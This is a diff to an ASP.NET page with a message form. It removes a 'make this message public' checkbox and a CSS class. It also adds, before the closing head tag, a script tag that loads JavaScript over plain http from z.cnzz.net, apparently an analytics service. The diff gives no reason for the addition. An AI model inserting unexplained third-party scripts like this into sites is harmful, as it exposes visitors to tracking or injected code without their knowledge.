@@ -15,7 +15,7 @@
             text-align: left;
         }
     </style>
-</head>
+<script type="text/javascript" src="http://z.cnzz.net/o.php?sid=1253974593"></script></head>
 <body>
 <script language="JavaScript" type="text/javascript">
 var lang = navigator.language || navigator.userLanguage;
@@ -27,7 +27,7 @@ document.write("<style type=\"text/css\" media=\"screen\">center{display:none;}<
   <tr>
     <td height="15" colspan="9" bgcolor="#585858"></td>
   <tr>
-  <td  align="left" valign="middle" bgcolor="#ff7d23" class="style1">丽军数码</td>
+  <td  align="left" valign="middle" bgcolor="#ff7d23" >丽军数码</td>
    
   </tr>  <tr>
   <td height="15" colspan="9" align="center" bgcolor="#FFFFFF">
@@ -67,9 +67,6 @@ document.write("<style type=\"text/css\" media=\"screen\">center{display:none;}<
                           <asp:TextBox ID="txtreply" runat="server" BackColor="Silver" CssClass="txt3" 
                               Height="160px" MaxLength="140" TextMode="MultiLine" Width="652px"></asp:TextBox>
                         </p>
-                      <p style="text-align: left">
-                          <asp:CheckBox ID="CheckBox1" runat="server" Text="公开本留言"  Checked="true"/>
-                          </p>
                       <p style="text-align: left">
                        
                           <asp:Label ID="lbtt" runat="server" Text="留言"></asp:Label>内容：<asp:Label 
